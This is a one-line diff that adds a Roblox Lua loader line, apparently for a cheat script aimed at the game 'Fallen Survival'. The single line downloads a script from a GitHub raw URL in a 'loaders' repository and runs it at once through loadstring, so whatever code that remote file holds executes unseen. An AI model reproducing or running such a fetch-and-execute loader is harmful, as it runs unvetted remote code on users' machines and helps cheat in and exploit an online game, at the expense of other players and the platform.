@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/new-map-fallen-survival-spam2-kphwdvllktlqyg.lua"))()
